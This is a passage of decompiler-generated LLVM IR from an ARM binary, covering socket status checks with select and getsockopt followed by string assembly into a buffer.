dec_label_pc_94c0:                                ; preds = %dec_label_pc_94a8
  %v0_94c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_94c0 = add i32 %v0_94c0, 1
  store i32 %v1_94c0, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_94c4:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9a80, %dec_label_pc_94c0
  %v0_94e498 = phi i32 [ %v1_9ab8, %dec_label_pc_9ab8 ], [ %v1_9a80, %dec_label_pc_9a80 ], [ %v1_94c0, %dec_label_pc_94c0 ]
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 1
  store i32 %v1_94c8, i32* @r8, align 4
  %v0_94cc = load i32, i32* @r7, align 4
  %v0_94d0 = load i32, i32* @r6, align 4
  %v2_94d4 = sub i32 %v0_90f4, %v1_94c8
  %v3_94d4 = icmp uge i32 %v0_90f4, %v1_94c8
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v4_94d4 = xor i32 %v1_94c8, %v0_90f4
  %v5_94d4 = xor i32 %v2_94d4, %v0_90f4
  %v6_94d4 = and i32 %v5_94d4, %v4_94d4
  %v7_94d4 = icmp slt i32 %v6_94d4, 0
  store i1 %v7_94d4, i1* %cpsr_v.global-to-local, align 1
  %v8_94d4 = icmp slt i32 %v2_94d4, 0
  store i1 %v8_94d4, i1* %cpsr_n.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v0_90f4, %v1_94c8
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = add i32 %v0_94cc, 3140
  store i32 %v1_94d8, i32* @r7, align 4
  %v1_94dc = add i32 %v0_94d0, 3140
  store i32 %v1_94dc, i32* @r6, align 4
  br i1 %v9_94d4, label %dec_label_pc_94e4, label %dec_label_pc_93a8

dec_label_pc_94e4:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge
  %v0_951c = phi i32 [ %v0_94e4.pre, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge ], [ %v0_94e498, %dec_label_pc_94c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94e4 = icmp slt i32 %v0_951c, 0
  store i1 %v1_94e4, i1* %cpsr_n.global-to-local, align 1
  %v2_94e4 = icmp eq i32 %v0_951c, 0
  store i1 %v2_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94e4, label %dec_label_pc_9280, label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94e4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_950c, i32* %ip.global-to-local, align 4
  store i32 %v2_9510, i32* %r1.global-to-local, align 4
  store i32 %v2_9514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_951c, i32* %r0.global-to-local, align 4
  %v5_9524 = call i32 @_select(i32 %v0_951c, i32 %v2_9510, i32 %v2_9514, i32 0, i32 %v2_950c)
  store i32 %v5_9524, i32* @r4, align 4
  %v0_952c = load i32, i32* @r5, align 4
  store i32 %v0_952c, i32* %r0.global-to-local, align 4
  %v1_9530 = call i32 @_time(i32 %v0_952c)
  store i32 %v1_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @r4, align 4
  %v1_9534 = load i32, i32* @r5, align 4
  %v2_9534 = sub i32 %v0_9534, %v1_9534
  %v3_9534 = icmp uge i32 %v0_9534, %v1_9534
  store i1 %v3_9534, i1* %cpsr_c.global-to-local, align 1
  %v4_9534 = xor i32 %v1_9534, %v0_9534
  %v5_9534 = xor i32 %v2_9534, %v0_9534
  %v6_9534 = and i32 %v5_9534, %v4_9534
  %v7_9534 = icmp slt i32 %v6_9534, 0
  store i1 %v7_9534, i1* %cpsr_v.global-to-local, align 1
  %v8_9534 = icmp slt i32 %v2_9534, 0
  store i1 %v8_9534, i1* %cpsr_n.global-to-local, align 1
  %v9_9534 = icmp eq i32 %v0_9534, %v1_9534
  store i1 %v9_9534, i1* %cpsr_z.global-to-local, align 1
  %v7_953c = icmp sgt i32 %v0_9534, %v1_9534
  br i1 %v7_953c, label %dec_label_pc_9540, label %dec_label_pc_9280

dec_label_pc_9540:                                ; preds = %dec_label_pc_94ec
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_95b0

dec_label_pc_954c:                                ; preds = %.thread38.dec_label_pc_954c_crit_edge, %dec_label_pc_95c0
  %v0_9564 = phi i32 [ %v0_954c.pre, %.thread38.dec_label_pc_954c_crit_edge ], [ %v3_95b0, %dec_label_pc_95c0 ]
  %v3_954c = udiv i32 %v0_9564, 32
  store i32 %v2_94a0, i32* %r2.global-to-local, align 4
  %v3_9558 = mul nuw nsw i32 %v3_954c, 4
  %v2_955c = add i32 %v3_9558, %v2_94a0
  store i32 %v2_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_955c, -164
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v1_9564 = urem i32 %v0_9564, 32
  store i32 %v1_9564, i32* %r1.global-to-local, align 4
  %v2_9568 = add nsw i32 %v1_9564, -1
  %v3_9568 = shl i32 1, %v2_9568
  %v4_9568 = and i32 %v3_9568, %v3_9560
  %v5_9568 = icmp ne i32 %v4_9568, 0
  store i1 %v5_9568, i1* %cpsr_c.global-to-local, align 1
  %v6_9568 = lshr i32 %v3_9560, %v1_9564
  store i32 %v6_9568, i32* %r2.global-to-local, align 4
  %v1_956c = urem i32 %v6_9568, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_956c = icmp eq i32 %v1_956c, 0
  store i1 %v2_956c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_956c, label %dec_label_pc_9590, label %dec_label_pc_9574

dec_label_pc_9574:                                ; preds = %dec_label_pc_954c
  %v0_9574 = load i32, i32* @r8, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i8*
  %v3_9574 = load i8, i8* %v2_9574, align 1
  %v4_9574 = zext i8 %v3_9574 to i32
  store i32 %v4_9574, i32* %r3.global-to-local, align 4
  %v2_9578 = icmp ugt i8 %v3_9574, 5
  store i1 %v2_9578, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9578 = icmp ult i8 %v3_9574, 6
  store i1 %v6_9578, i1* %cpsr_n.global-to-local, align 1
  %v7_9578 = icmp eq i8 %v3_9574, 6
  store i1 %v7_9578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9578, label %dec_label_pc_9b28, label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9574
  %v2_9580 = icmp ugt i8 %v3_9574, 6
  store i1 %v2_9580, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9580 = icmp ult i8 %v3_9574, 7
  store i1 %v6_9580, i1* %cpsr_n.global-to-local, align 1
  %v7_9580 = icmp eq i8 %v3_9574, 7
  store i1 %v7_9580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9580, label %dec_label_pc_a164, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9580
  %v2_9588 = icmp ugt i8 %v3_9574, 9
  store i1 %v2_9588, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9588 = icmp ult i8 %v3_9574, 10
  store i1 %v6_9588, i1* %cpsr_n.global-to-local, align 1
  %v7_9588 = icmp eq i8 %v3_9574, 10
  store i1 %v7_9588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9588, label %dec_label_pc_a374, label %dec_label_pc_9590

dec_label_pc_9590:                                ; preds = %dec_label_pc_a268, %dec_label_pc_a6a8, %dec_label_pc_a7f0, %dec_label_pc_a66c, %dec_label_pc_9588, %dec_label_pc_954c, %dec_label_pc_95b0, %dec_label_pc_aadc, %dec_label_pc_a88c, %dec_label_pc_a7d4, %dec_label_pc_a68c, %dec_label_pc_a654, %dec_label_pc_a5dc, %dec_label_pc_a3b4, %dec_label_pc_9634, %dec_label_pc_a158
  store i32 %v0_90f4, i32* %r3.global-to-local, align 4
  %v1_9598 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_9598, i32* %r2.global-to-local, align 4
  %v0_959c = load i32, i32* @r8, align 4
  %v2_95a0 = sub i32 %v1_9598, %v0_90f4
  %v3_95a0 = icmp uge i32 %v1_9598, %v0_90f4
  store i1 %v3_95a0, i1* %cpsr_c.global-to-local, align 1
  %v4_95a0 = xor i32 %v1_9598, %v0_90f4
  %v5_95a0 = xor i32 %v2_95a0, %v1_9598
  %v6_95a0 = and i32 %v5_95a0, %v4_95a0
  %v7_95a0 = icmp slt i32 %v6_95a0, 0
  store i1 %v7_95a0, i1* %cpsr_v.global-to-local, align 1
  %v8_95a0 = icmp slt i32 %v2_95a0, 0
  store i1 %v8_95a0, i1* %cpsr_n.global-to-local, align 1
  %v9_95a0 = icmp eq i32 %v1_9598, %v0_90f4
  store i1 %v9_95a0, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = add i32 %v0_959c, 3140
  store i32 %v1_95a8, i32* @r8, align 4
  br i1 %v9_95a0, label %dec_label_pc_9280, label %dec_label_pc_95b0

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9590, %dec_label_pc_9540
  %v0_95b8 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_9540 ], [ %v1_95a8, %dec_label_pc_9590 ]
  %stack_var_-20832.0 = phi i32 [ %v1_9534, %dec_label_pc_9540 ], [ %v1_9598, %dec_label_pc_9590 ]
  %v1_95b0 = add i32 %v0_95b8, -1456
  %v2_95b0 = inttoptr i32 %v1_95b0 to i32*
  %v3_95b0 = load i32, i32* %v2_95b0, align 4
  store i32 %v3_95b0, i32* %r0.global-to-local, align 4
  %v1_95b4 = add i32 %v3_95b0, 1
  %v2_95b4 = icmp eq i32 %v3_95b0, -1
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v3_95b4 = sub i32 0, %v3_95b0
  %v4_95b4 = and i32 %v1_95b4, %v3_95b4
  %v5_95b4 = icmp slt i32 %v4_95b4, 0
  store i1 %v5_95b4, i1* %cpsr_v.global-to-local, align 1
  %v6_95b4 = icmp slt i32 %v1_95b4, 0
  store i1 %v6_95b4, i1* %cpsr_n.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v1_95b4, 0
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_95b0, i32* %sb.global-to-local, align 4
  br i1 %v7_95b4, label %dec_label_pc_9590, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_95b0
  %v3_95c0 = udiv i32 %v3_95b0, 32
  %v3_95c8 = mul nuw nsw i32 %v3_95c0, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_95d0 = add i32 %v3_95c8, %v2_94a0
  store i32 %v2_95d0, i32* %r3.global-to-local, align 4
  %v1_95d4 = add i32 %v2_95d0, -292
  %v2_95d4 = inttoptr i32 %v1_95d4 to i32*
  %v3_95d4 = load i32, i32* %v2_95d4, align 4
  %v1_95d8 = urem i32 %v3_95b0, 32
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  %v2_95dc = add nsw i32 %v1_95d8, -1
  %v3_95dc = shl i32 1, %v2_95dc
  %v4_95dc = and i32 %v3_95d4, %v3_95dc
  %v5_95dc = icmp ne i32 %v4_95dc, 0
  store i1 %v5_95dc, i1* %cpsr_c.global-to-local, align 1
  %v6_95dc = lshr i32 %v3_95d4, %v1_95d8
  store i32 %v6_95dc, i32* %r2.global-to-local, align 4
  %v1_95e0 = urem i32 %v6_95dc, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_95e0 = icmp eq i32 %v1_95e0, 0
  store i1 %v2_95e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95e0, label %dec_label_pc_954c, label %dec_label_pc_95e8

dec_label_pc_95e8:                                ; preds = %dec_label_pc_95c0
  store i32 4, i32* @r4, align 4
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_9600, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_960c, i32* %lr.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_9618 = call i32 @_getsockopt(i32 %v3_95b0, i32 1, i32 4, i32 %v2_9600, i32 %v2_960c)
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9620 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9620, i32* %r3.global-to-local, align 4
  %v2_9624 = or i32 %v3_9620, %v5_9618
  store i32 %v2_9624, i32* %r0.global-to-local, align 4
  %v3_9624 = icmp slt i32 %v2_9624, 0
  store i1 %v3_9624, i1* %cpsr_n.global-to-local, align 1
  %v4_9624 = icmp eq i32 %v2_9624, 0
  store i1 %v4_9624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_9624, label %.thread38, label %dec_label_pc_9634

.thread38:                                        ; preds = %dec_label_pc_95e8
  %v1_9628 = load i32, i32* @r8, align 4
  %v2_9628 = add i32 %v1_9628, -1456
  %v3_9628 = inttoptr i32 %v2_9628 to i32*
  %v4_9628 = load i32, i32* %v3_9628, align 4
  store i32 %v4_9628, i32* %r0.global-to-local, align 4
  %v1_962c = load i32, i32* @r4, align 4
  %v2_962c = trunc i32 %v1_962c to i8
  %v4_962c = add i32 %v1_9628, -1452
  %v5_962c = inttoptr i32 %v4_962c to i8*
  store i8 %v2_962c, i8* %v5_962c, align 1
  %v0_9630.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9630.pr.pr, label %.thread38.dec_label_pc_954c_crit_edge, label %dec_label_pc_9634

.thread38.dec_label_pc_954c_crit_edge:            ; preds = %.thread38
  %v0_954c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_954c

dec_label_pc_9634:                                ; preds = %dec_label_pc_95e8, %.thread38
  %v0_9634 = load i32, i32* @r8, align 4
  %v1_9634 = add i32 %v0_9634, -1456
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  %v1_9638 = call i32 @_close(i32 %v3_9634)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_9640 = load i32, i32* @r8, align 4
  %v2_9640 = add i32 %v1_9640, -1456
  %v3_9640 = inttoptr i32 %v2_9640 to i32*
  store i32 -1, i32* %v3_9640, align 4
  %v0_9644 = load i32, i32* @r5, align 4
  %v1_9644 = trunc i32 %v0_9644 to i8
  %v2_9644 = load i32, i32* @r8, align 4
  %v3_9644 = add i32 %v2_9644, -1452
  %v4_9644 = inttoptr i32 %v3_9644 to i8*
  store i8 %v1_9644, i8* %v4_9644, align 1
  br label %dec_label_pc_9590

dec_label_pc_964c:                                ; preds = %dec_label_pc_93a8
  %v1_964c = add i32 %v3_9658, 25
  %v2_964c = inttoptr i32 %v1_964c to i32*
  %v3_964c = load i32, i32* %v2_964c, align 4
  store i32 %v3_964c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9650 = icmp slt i32 %v3_964c, 0
  store i1 %v1_9650, i1* %cpsr_n.global-to-local, align 1
  %v2_9650 = icmp eq i32 %v3_964c, 0
  store i1 %v2_9650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9650, label %.thread43, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_964c
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_93a8, align 1
  %v0_965c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_965c.pr.pr, label %.thread41..thread43_crit_edge, label %dec_label_pc_9664

.thread41..thread43_crit_edge:                    ; preds = %.thread41
  %v1_965c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_965c.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_965c.pre to i8
  br label %.thread43

.thread43:                                        ; preds = %.thread41..thread43_crit_edge, %dec_label_pc_964c
  %v3_965c = phi i32 [ %v3_965c.pre, %.thread41..thread43_crit_edge ], [ %v3_9658, %dec_label_pc_964c ]
  %v1_965c.off0 = phi i8 [ %extract.t, %.thread41..thread43_crit_edge ], [ 0, %dec_label_pc_964c ]
  %v4_965c = add i32 %v3_965c, -1427
  %v5_965c = inttoptr i32 %v4_965c to i8*
  store i8 %v1_965c.off0, i8* %v5_965c, align 1
  %v0_9660.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9660.pr, label %.thread43.dec_label_pc_93bc_crit_edge, label %dec_label_pc_9664

.thread43.dec_label_pc_93bc_crit_edge:            ; preds = %.thread43
  %v0_93bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_93bc

dec_label_pc_9664:                                ; preds = %.thread41, %.thread43, %dec_label_pc_9318
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_966c = load i32, i32* @r7, align 4
  %v1_966c = add i32 %v0_966c, 2112
  store i32 %v1_966c, i32* %r0.global-to-local, align 4
  %v1_9670 = load i32, i32* @r6, align 4
  %v2_9670 = add i32 %v1_9670, 33
  %v3_9670 = inttoptr i32 %v2_9670 to i32*
  store i32 -1, i32* %v3_9670, align 4
  %v0_9674 = load i32, i32* %r0.global-to-local, align 4
  %v1_9674 = add i32 %v0_9674, 4
  store i32 %v1_9674, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_967c = load i32, i32* @r5, align 4
  %v1_967c = load i32, i32* @r6, align 4
  %v2_967c = add i32 %v1_967c, 21
  %v3_967c = inttoptr i32 %v2_967c to i32*
  store i32 %v0_967c, i32* %v3_967c, align 4
  %v2_9680 = call i32 @function_146ac(i32 %v1_9674, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_968c = load i32, i32* @r5, align 4
  %v1_968c = load i32, i32* @r6, align 4
  %v2_968c = add i32 %v1_968c, 681
  %v3_968c = inttoptr i32 %v2_968c to i32*
  store i32 %v0_968c, i32* %v3_968c, align 4
  %v2_9690 = call i32 @function_146ac(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9698 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_96a0 = load i32, i32* @r6, align 4
  store i32 %v0_96a0, i32* %r1.global-to-local, align 4
  %v2_96a4 = add i32 %v2_9698, %stack_var_-20856.0.ph
  store i32 %v2_96a4, i32* @r0, align 4
  %v2_96a8 = inttoptr i32 %v2_96a4 to i8*
  %v3_96a8 = call i32 @function_14634(i8* %v2_96a8, i32 %v0_96a0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96b0 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f64.82 to i32), i32* %r1.global-to-local, align 4
  %v2_96bc = add i32 %v2_96b0, %stack_var_-20856.0.ph
  store i32 %v2_96bc, i32* @r0, align 4
  %v2_96c0 = inttoptr i32 %v2_96bc to i8*
  %v3_96c0 = call i32 @function_14634(i8* %v2_96c0, i32 ptrtoint (i32* @global_var_14f64.82 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96c8 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_96d0 = load i32, i32* @r7, align 4
  %v1_96d0 = add i32 %v0_96d0, 532
  store i32 %v1_96d0, i32* %r1.global-to-local, align 4
  %v2_96d4 = add i32 %v2_96c8, %stack_var_-20856.0.ph
  store i32 %v2_96d4, i32* @r0, align 4
  %v2_96d8 = inttoptr i32 %v2_96d4 to i8*
  %v3_96d8 = call i32 @function_14634(i8* %v2_96d8, i32 %v1_96d0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96e0 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_14f3c.84 to i32), i32* %r1.global-to-local, align 4
  %v2_96ec = add i32 %v2_96e0, %stack_var_-20856.0.ph
  store i32 %v2_96ec, i32* @r0, align 4
  %v3_96f0 = inttoptr i32 %v2_96ec to i8*
  %v4_96f0 = call i32 @function_14634(i8* %v3_96f0, i32 ptrtoint ([24 x i8]* @global_var_14f3c.84 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_96f8 = call i32 @function_1460c(i8* %v1_9698)
  %v2_9700 = add i32 %v2_96f8, %stack_var_-20856.0.ph
  store i32 %v2_9700, i32* @r0, align 4
  %v0_9704 = load i32, i32* @r7, align 4
  %v1_9704 = add i32 %v0_9704, 20
  store i32 %v1_9704, i32* %r1.global-to-local, align 4
  %v2_9708 = inttoptr i32 %v2_9700 to i8*
  %v3_9708 = call i32 @function_14634(i8* %v2_9708, i32 %v1_9704)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9710 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14f54.86 to i32), i32* %r1.global-to-local, align 4
  %v2_971c = add i32 %v2_9710, %stack_var_-20856.0.ph
  store i32 %v2_971c, i32* @r0, align 4
  %v3_9720 = inttoptr i32 %v2_971c to i8*
  %v4_9720 = call i32 @function_14634(i8* %v3_9720, i32 ptrtoint ([9 x i8]* @global_var_14f54.86 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9728 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_9730 = load i32, i32* @r7, align 4
  %v2_9734 = add i32 %v2_9728, %stack_var_-20856.0.ph
  store i32 %v2_9734, i32* @r0, align 4
  %v1_9738 = add i32 %v0_9730, 789
  store i32 %v1_9738, i32* %r1.global-to-local, align 4
  %v2_973c = inttoptr i32 %v2_9734 to i8*
  %v3_973c = call i32 @function_14634(i8* %v2_973c, i32 %v1_9738)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9744 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_9750 = add i32 %v2_9744, %stack_var_-20856.0.ph
  store i32 %v2_9750, i32* @r0, align 4
  %v3_9754 = inttoptr i32 %v2_9750 to i8*
  %v4_9754 = call i32 @function_14634(i8* %v3_9754, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_975c = call i32 @function_13ce8(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9764 = call i32 @function_1460c(i8* %v1_9698)
  %v0_9768 = load i32, i32* @r5, align 4
  store i32 %v0_9768, i32* %r1.global-to-local, align 4
  store i32 %v2_9764, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_9774 = inttoptr i32 %v0_9768 to i32*
  %v3_9774 = call i32 @function_13c04(i32 32, i32* %v2_9774)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_9774, i32* %r1.global-to-local, align 4
  %v1_9780 = load i32, i32* @r4, align 4
  %v2_9780 = add i32 %v1_9780, %stack_var_-20856.0.ph
  store i32 %v2_9780, i32* @r0, align 4
  %v2_9784 = inttoptr i32 %v2_9780 to i8*
  %v3_9784 = call i32 @function_14634(i8* %v2_9784, i32 %v3_9774)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_978c = call i32 @function_13c30(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9794 = call i32 @function_1460c(i8* %v1_9698)
  %v2_979c = add i32 %v2_9794, %stack_var_-20856.0.ph
  store i32 %v2_979c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v3_97a4 = inttoptr i32 %v2_979c to i8*
  %v4_97a4 = call i32 @function_14634(i8* %v3_97a4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97ac = call i32 @function_13ce8(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97b4 = call i32 @function_1460c(i8* %v1_9698)
  %v0_97b8 = load i32, i32* @r5, align 4
  store i32 %v0_97b8, i32* %r1.global-to-local, align 4
  store i32 %v2_97b4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_97c4 = inttoptr i32 %v0_97b8 to i32*
  %v3_97c4 = call i32 @function_13c04(i32 33, i32* %v2_97c4)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_97c4, i32* %r1.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %stack_var_-20856.0.ph
  store i32 %v2_97d0, i32* @r0, align 4
  %v2_97d4 = inttoptr i32 %v2_97d0 to i8*
  %v3_97d4 = call i32 @function_14634(i8* %v2_97d4, i32 %v3_97c4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_97dc = call i32 @function_13c30(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_97e4 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_97f0 = add i32 %v2_97e4, %stack_var_-20856.0.ph
  store i32 %v2_97f0, i32* @r0, align 4
  %v3_97f4 = inttoptr i32 %v2_97f0 to i8*
  %v4_97f4 = call i32 @function_14634(i8* %v3_97f4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_97fc = call i32 @function_13ce8(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9804 = call i32 @function_1460c(i8* %v1_9698)
  %v0_9808 = load i32, i32* @r5, align 4
  store i32 %v0_9808, i32* %r1.global-to-local, align 4
  store i32 %v2_9804, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_9814 = inttoptr i32 %v0_9808 to i32*
  %v3_9814 = call i32 @function_13c04(i32 34, i32* %v2_9814)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_9814, i32* %r1.global-to-local, align 4
  %v1_9820 = load i32, i32* @r4, align 4
  %v2_9820 = add i32 %v1_9820, %stack_var_-20856.0.ph
  store i32 %v2_9820, i32* @r0, align 4
  %v2_9824 = inttoptr i32 %v2_9820 to i8*
  %v3_9824 = call i32 @function_14634(i8* %v2_9824, i32 %v3_9814)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_982c = call i32 @function_13c30(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9834 = call i32 @function_1460c(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r1.global-to-local, align 4
  %v2_9840 = add i32 %v2_9834, %stack_var_-20856.0.ph
  store i32 %v2_9840, i32* @r0, align 4
  %v3_9844 = inttoptr i32 %v2_9840 to i8*
  %v4_9844 = call i32 @function_14634(i8* %v3_9844, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32))
  store i32 %v4_9844, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v1_984c = load i32, i32* @r5, align 4
  %v2_984c = sub i32 %v6_8f58, %v1_984c
  %v3_984c = icmp uge i32 %v6_8f58, %v1_984c
  store i1 %v3_984c, i1* %cpsr_c.global-to-local, align 1
  %v4_984c = xor i32 %v1_984c, %v6_8f58
  %v5_984c = xor i32 %v2_984c, %v6_8f58
  %v6_984c = and i32 %v5_984c, %v4_984c
  %v7_984c = icmp slt i32 %v6_984c, 0
  store i1 %v7_984c, i1* %cpsr_v.global-to-local, align 1
  %v8_984c = icmp slt i32 %v2_984c, 0
  store i1 %v8_984c, i1* %cpsr_n.global-to-local, align 1
  %v9_984c = icmp eq i32 %v6_8f58, %v1_984c
  store i1 %v9_984c, i1* %cpsr_z.global-to-local, align 1
